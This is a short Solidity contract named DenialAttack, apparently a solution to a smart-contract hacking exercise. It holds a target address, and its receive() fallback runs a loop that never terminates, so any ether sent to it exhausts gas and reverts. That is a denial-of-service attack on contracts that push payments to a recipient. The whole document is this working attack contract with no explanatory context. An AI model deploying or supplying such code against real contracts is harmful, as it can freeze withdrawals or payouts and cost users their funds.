// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract DenialAttack {
    address payable target;
    constructor(address payable _target) payable {
        target = _target;
    }
    receive() external payable {
        for(uint i = 1; i < 2 ; ++i) {
            i--;
        }
    }
}